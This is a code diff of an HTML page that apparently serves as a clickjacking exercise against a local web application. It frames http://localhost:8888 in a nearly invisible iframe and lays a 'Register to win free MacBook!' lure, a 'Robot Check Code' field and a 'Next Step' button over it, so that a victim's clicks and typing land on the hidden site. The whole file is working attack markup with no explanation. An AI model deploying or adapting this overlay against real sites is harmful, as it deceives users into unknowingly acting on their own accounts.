@@ -1,11 +1,29 @@
 <html>
 <head>
 </head>
+<style>
+.iframe-div {
+  width: 365px;  height: 30px; overflow: hidden; display: block;
+  position: absolute; top: 153px;  left: 30px; }
+.iframe-hack { width: 300px;  height: 188px;  border: 0; border: none; 
+   overflow: hidden; margin-top: -163px; margin-left: -20px; opacity: 0.1;}
+.div-hack { width: 365px;  height: 188px; position: absolute; padding: 30px; }
+.div-hack > .mal-input { top: 145px; left: 32px; position: absolute; }
+.div-hack > .mal-button { top: 148px; left: 168px; position: absolute; }
+</style>
 <body>
   <div>
-    <image style="width: 180px; height: 60px; position: absolute;" src="./hijack.png"></image>
-    <iframe src="http://localhost:8888/hijack.html" 
-      style="width: 300px; height: 150px; border: 0; border: none; position: absolute; opacity: 0.1;"></iframe>
+    <div class="div-hack"> 
+      <h2>Register to win free MacBook!</h2>
+      Robot Check Code: <br />
+      hackerAccount: <br />
+      <input class="mal-input" type="text" />
+      <input class="mal-button" type="button" value="Next Step" />
+    </div>
+    <div class="iframe-div">
+      <iframe src="http://localhost:8888" scrolling="no" 
+        class="iframe-hack"></iframe>
+    </div>
   </div>
 </body>
 </html>
